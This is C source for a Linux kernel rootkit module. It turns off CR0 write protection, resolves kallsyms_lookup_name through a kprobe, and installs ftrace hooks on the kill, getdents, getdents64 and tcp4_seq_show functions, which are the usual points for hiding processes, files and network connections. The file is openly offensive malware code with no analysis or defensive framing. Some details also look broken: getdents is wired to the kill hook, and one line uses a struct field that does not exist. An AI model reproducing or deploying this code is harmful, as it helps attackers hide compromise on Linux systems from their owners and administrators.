#include <linux/kallsyms.h>
#include <linux/version.h>

#include "hooks/getdents.h"
#include "hooks/getdents64.h"
#include "hooks/kill.h"
#include "hooks/tcp4_seq_show.h"

#if !KALLSYMS_LOOKUP_NAME_EXPORT
#include <linux/kprobes.h>
#endif

#define HOOK(_name, _hook, _orig)                                                                            \
  {                                                                                                          \
    .name = (_name), .func = (_hook), .orig = (_orig)                                                        \
  }

struct ftrace_hook {
  const char* name;
  void* func;
  void* orig;

  unsigned long addr;
  struct ftrace_ops ops;
};

#ifdef PTREGS_SYSCALL_STUBS
typedef unsigned long (*kallsyms_lookup_name_t)(const char* name);

kallsyms_lookup_name_t my_kallsyms_lookup_name;

asmlinkage long (*orig_kill)(const struct pt_regs*);
asmlinkage long (*orig_getdents64)(const struct pt_regs*);
asmlinkage long (*orig_getdents)(const struct pt_regs*);
asmlinkage ssize_t (*orig_sys_recvmsg)(const struct pt_regs* regs);
#else
asmlinkage long (*orig_kill)(pid_t pid, int sig);
asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64* dirent, unsigned int count);
asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent* dirent, unsigned int count);
#endif

asmlinkage int (*orig_tcp4_seq_show)(struct seq_file* seq, void* v);

/**
 * Unprotect read-only pages without warning from kernel (clear 16th bit in
 * CR0).
 *
 * - from native_write_cr0 in arch/x86/kernel/cpu/common.c
 * @param val Value to write
 */
inline void my_native_write_cr0(unsigned long val) { asm volatile("mov %0,%%cr0" : "+r"(val) : : "memory"); }

/**
 * Re-enable sys_call_table write protection when hooking/unhooking
 */
static void enable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  my_native_write_cr0(cr0);
  printk(KERN_DEBUG "rootkit: Write protection enabled\n");
}

/**
 * Disable sys_call_table write protection when hooking/unhooking
 */
static void disable_write_protection(void)
{
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  my_native_write_cr0(cr0);
  printk(KERN_DEBUG "rootkit: Write protection disabled\n");
}

/* Ftrace needs to know the address of the original function that we
 * are going to hook. As before, we just use kallsyms_lookup_name()
 * to find the address in kernel memory.
 */
static int resolve_hook_address(struct ftrace_hook* hook)
{
#ifdef PTREGS_SYSCALL_STUBS
  // typedef unsigned long (*kallsyms_lookup_name_t)(const char* name);
  // kallsyms_lookup_name_t kallsyms_lookup_name;
  if (!my_kallsyms_lookup_name) {
    static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};

    if (!my_kallsyms_lookup_name && register_kprobe(&kp) < 0) {
      printk(KERN_ALERT "rootkit: Unable to locate kallsyms_lookup_name\n");
      return -ENOENT;
    }

    my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
  }
  hook->addr = my_kallsyms_lookup_name(hook->name);
#else
  hook->addr = kallsyms_lookup_name(hook->name);
#endif

  if (!hook->addr) {
    printk(KERN_ALERT "rootkit: unresolved symbol: %s", hook->name);
    return -ENOENT;
  }

#if USE_FENTRY_OFFSET
  *((unsigned long*) hook->orig) = hook->addr + MCOUNT_INSN_SIZE;
#else
  *((unsigned long*) hook->orig) = hook->addr;
#endif

  return 0;
}

/* See comment below within install_hook() */
static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops* ops,
                                 struct ftrace_regs* regs)
{
  struct ftrace_hook* hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
  regs->ip = (unsigned long) hook->function;
#else
  if (!within_module(parent_ip, THIS_MODULE))
    regs->regs.ip = (unsigned long) hook->func;
#endif
}

/* Assuming we've already set hook->name, hook->func and hook->orig, we
 * can go ahead and install the hook with ftrace. This is done by setting the
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 */
int install_hook(struct ftrace_hook* hook)
{
  int err;

  err = resolve_hook_address(hook);
  if (err)
    return err;
  /* For many of function hooks (especially non-trivial ones), the $rip
   * register gets modified, so we have to alert ftrace to this fact. This
   * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
   * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
   * the built-in anti-recursion guard provided by ftrace is useless if
   * we're modifying $rip. This is why we have to implement our own checks
   * (see USE_FENTRY_OFFSET). */
  hook->ops.func = ftrace_thunk;
  hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

  err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
  if (err) {
    printk(KERN_ALERT "rootkit: ftrace_set_filter_ip() failed: %d", err);
    return err;
  }

  err = register_ftrace_function(&hook->ops);
  if (err) {
    printk(KERN_ALERT "rootkit: register_ftrace_function() failed: %d", err);
    return err;
  }

  printk(KERN_DEBUG "rootkit: Hooked %s\n", hook->name);
  return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in install_hook()).
 */
void remove_hook(struct ftrace_hook* hook)
{
  int err;
  err = unregister_ftrace_function(&hook->ops);
  if (err)
    printk(KERN_ALERT "rootkit: unregister_ftrace_function() failed: %d", err);

  err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
  if (err)
    printk(KERN_ALERT "rootkit: ftrace_set_filter_ip() failed: %d", err);

  printk(KERN_DEBUG "rootkit: Unhooked %s\n", hook->name);
}

/* To make it easier to hook multiple functions in one module, this provides
 * a simple loop over an array of ftrace_hook struct
 */
int install_hooks(struct ftrace_hook* hooks, size_t count)
{
  int err;
  size_t i;

  for (i = 0; i < count; i++) {
    err = install_hook(&hooks[i]);
    if (err)
      goto error;
  }
  return 0;

error:
  while (i)
    remove_hook(&hooks[--i]);
  return err;
}

void remove_hooks(struct ftrace_hook* hooks, size_t count)
{
  size_t i;

  for (i = 0; i < count; i++)
    remove_hook(&hooks[i]);
}

static struct ftrace_hook hooks[] = {HOOK("__x64_sys_kill", hook_kill, &orig_kill),
                                     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
                                     HOOK("__x64_sys_getdents", hook_kill, &orig_getdents),
                                     HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show)};

/**
 * Locate kallsyms_lookup_name, sys_call_table, and hook syscalls
 */
void hook_syscalls(void)
{
  // Disable read-only page write protection and hook
  printk(KERN_DEBUG "rootkit: Hooking...\n");
  disable_write_protection();
  install_hooks(hooks, ARRAY_SIZE(hooks));
  enable_write_protection();
}

/**
 * Unhook syscalls
 */
void unhook_syscalls(void)
{
  // Disable read-only page write protection and unhook
  printk(KERN_DEBUG "rootkit: Unhooking...\n");
  disable_write_protection();
  remove_hooks(hooks, ARRAY_SIZE(hooks));
  enable_write_protection();
}
